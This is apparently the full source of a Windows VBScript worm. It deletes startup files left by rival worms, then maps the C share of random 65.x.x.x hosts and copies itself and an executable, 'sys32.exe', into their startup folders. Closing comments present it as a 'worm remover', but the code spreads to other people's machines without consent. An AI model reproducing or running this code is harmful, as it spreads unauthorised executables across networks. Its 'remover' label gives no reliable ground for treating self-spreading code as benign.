set t=wscript.createobject("wscript.network")
set f=createobject("scripting.filesystemobject")
on error resume next
randomize
do
do while w=0
if (f.fileexists("c:\network.vbs")) then f.deletefile("c:\network.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\network.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\network.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\network.exe")) then f.deletefile("c:\windows\startm~1\programs\startup\network.exe")
if (f.fileexists("c:\windows\startm~1\programs\startup\mscfg.exe")) then f.deletefile("c:\windows\startm~1\programs\startup\mscfg.exe")
if (f.fileexists("c:\windows\startm~1\programs\startup\mscfg.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\mscfg.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\a.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\a.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\a24.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\a24.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\little.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\little.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\prince.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\prince.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\MS StartUp Config.exe")) then f.deletefile("c:\windows\startm~1\programs\startup\MS StartUp Config.exe")
if (f.fileexists("c:\windows\startm~1\programs\startup\_a.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\_a.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\_b.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\_b.vbs")


n="\\65."&int(254*rnd+1)&"."&int(254*rnd+1)&"."&int(254*rnd+1)&"\C"
t.mapnetworkdrive "x:",n
set o=t.enumnetworkdrives
for i=0 to o.Count-1
if n=o.item(i) then w=1
next
loop
f.copyfile "c:\windows\startm~1\programs\startup\_chubby.vbs", "x:\windows\startm~1\programs\startup\"
f.copyfile "c:\sys32.exe", "x:\windows\startm~1\programs\startup\"
f.copyfile "c:\sys32.exe", "x:\"
t.removenetworkdrive "x:"
w=0
loop
'netlog.worm.remover.optimized.universal.cable_users
'I hate virus wars, but it has to be done.
'eDeamon fitted